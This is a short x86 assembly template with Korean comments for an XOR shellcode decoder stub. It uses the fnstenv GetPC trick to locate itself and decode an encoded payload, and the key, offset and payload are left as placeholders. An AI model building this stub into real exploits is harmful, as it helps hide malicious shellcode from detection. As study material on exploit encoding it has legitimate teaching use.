[BITS 32]

global _start

_start:

fabs					;1. 아무 해가 없는 FPU 명령어
fnstenv [esp-0xc]		;2. FPU 환경 덤프. ESP-12에 기록
pop edx				;3. eip의 fabs FPU instruction을 팝하여 edx에 저장
add dl, 00			;4. fabs로부터의 오프셋 -> xor 버퍼
(placeholder)

short_xor_beg:
xor ecx,ecx			;5. 루프를 위해 ecx 초기화
mov cl, 0x18			;6. xor한 페이로드의 크기

short_xor_xor:
xor byte [edx], 0x00	;7. xor할 바이트(키 플레이스 홀더)
inc edx				;8. EDX를 다음 바이트로 증가
loop short_xor_xor	;9. 모든 셸코드 루프

shellcode:
; 디코딩된 셸코드가 이곳에 옴
